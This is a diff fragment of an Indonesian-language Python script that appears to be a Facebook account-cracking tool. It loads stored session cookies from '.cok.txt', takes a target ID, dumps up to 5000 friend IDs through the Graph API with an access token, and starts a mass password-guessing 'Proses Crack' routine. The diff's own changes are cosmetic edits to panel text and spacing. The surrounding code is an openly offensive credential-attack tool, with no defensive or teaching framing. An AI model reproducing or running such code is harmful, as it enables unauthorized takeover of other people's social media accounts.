@@ -1453,7 +1453,7 @@ def xyzoncrackpublik():
 		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	cetak(panel('\t\t[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Publik [bold red]]",style=f"bold red"))
+	cetak(panel('\t          [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Massal [bold red]]",style=f"bold red"))
 	pil = input(f' {P}[{H}+{P}]\33[1;96m Target ID :{P} ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
@@ -1477,7 +1477,7 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		cetak(panel('\t            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Massal [bold red]]",style=f"bold red"))
+		cetak(panel('\t          [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red][[bold green] Crack Massal [bold red]]",style=f"bold red"))
 		jum = int(input(f' {P}[{H}+{P}]\33[1;96m Mau Berapa Idz Target  :{P} '))
 	except ValueError:
 		print(' [+]\33[1;91m Wrong input ')
@@ -1587,7 +1587,7 @@ def passwrd():
 	urut = []
 	print(M+' <------------------------------------------------------------------------------------->')
 	wa.print(Columns(urut))
-	cetak(panel(f'\t[bold cyan]        On/Off Mode Pesawat Jika Tidak Ada Hasil!!!',width=90,title=f"[bold red][ [bold green]Informasi [bold red]]",subtitle=f"[bold red][[bold green] Proses Crack [bold red]]",style=f"bold red"))
+	cetak(panel(f'\t[bold cyan]          On/Off Mode Pesawat Jika Tidak Ada Hasil!!!',width=90,title=f"[bold red][ [bold green]Informasi [bold red]]",subtitle=f"[bold red][[bold green] Proses Crack [bold red]]",style=f"bold red"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
